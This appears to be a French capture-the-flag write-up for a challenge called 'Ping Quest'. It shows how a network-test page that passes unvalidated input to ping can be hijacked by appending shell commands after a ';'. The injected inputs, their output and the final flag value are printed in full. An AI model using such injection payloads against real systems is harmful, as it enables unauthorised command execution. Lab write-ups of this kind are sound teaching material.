# Ping Quest

## Command Injection
En nous rendant sur l'URL donné par le chall nous pouvons voir une page assez simple pour "tester le réseau". 
Nous pouvons commencer à ping n'importe quelle IP. 
Le problème ici est qu'il n'y a aucune validation de l'entrée utilisateur. Nous pouvons donc rentrer n'importe quelle commande grâce au séprateur ``;``. 

Voici un exemple :
````Bash
8.8.8.8; ls -lah
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=13.9 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 13.947/13.947/13.947/0.000 ms
total 8K     
drwxr-xr-x    1 root     root          12 Nov  3 15:22 .
drwxr-xr-x    1 root     root          12 Nov  5 08:59 ..
-rw-r--r--    1 root     root        5.3K Nov  3 15:19 app.py
````

Nous pouvons voir où nous nous trouvons grâce à ``pwd`` : 
`````Bash
8.8.8.8; pwd
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=17.1 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 17.079/17.079/17.079/0.000 ms
/app
`````
Ok nous sommes dans ``/app``, nous allons lister la racine du docker : 
````Bash
8.8.8.8; ls -lah / 
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.3 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 14.325/14.325/14.325/0.000 ms
total 4K     
drwxr-xr-x    1 root     root          12 Nov  5 08:59 .
drwxr-xr-x    1 root     root          12 Nov  5 08:59 ..
-rwxr-xr-x    1 root     root           0 Nov  5 08:59 .dockerenv
drwxr-xr-x    1 root     root          12 Nov  3 15:22 app
drwxr-xr-x    1 root     root          18 Nov  3 15:21 bin
drwxr-xr-x    5 root     root         320 Nov  5 08:59 dev
drwxr-xr-x    1 root     root          36 Nov  5 08:59 etc
-r--r--r--    1 root     root          25 Nov  3 15:21 flag.txt
drwxr-xr-x    1 root     root           0 Oct  8 09:29 home
drwxr-xr-x    1 root     root           6 Oct  8 09:29 lib
drwxr-xr-x    1 root     root          28 Oct  8 09:29 media
drwxr-xr-x    1 root     root           0 Oct  8 09:29 mnt
drwxr-xr-x    1 root     root           0 Oct  8 09:29 opt
dr-xr-xr-x  266 root     root           0 Nov  5 08:59 proc
drwx------    1 root     root          12 Nov  3 15:21 root
drwxr-xr-x    1 root     root           8 Oct  8 09:29 run
drwxr-xr-x    1 root     root         790 Oct  8 09:29 sbin
drwxr-xr-x    1 root     root           0 Oct  8 09:29 srv
dr-xr-xr-x   11 root     root           0 Nov  5 08:59 sys
drwxrwxrwt    1 root     root           0 Nov  3 15:22 tmp
drwxr-xr-x    1 root     root          10 Oct 31 23:16 usr
drwxr-xr-x    1 root     root          86 Oct  8 09:29 var
````
Parfait nous voyons le fichier ``flag.txt``, il nous manque plus qu'a lire son contenu avec ``cat``: 
```` Bash
8.8.8.8; cat /flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=17.9 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 17.911/17.911/17.911/0.000 ms
SKL{C0mm4nd-_-1njecti0n}
````
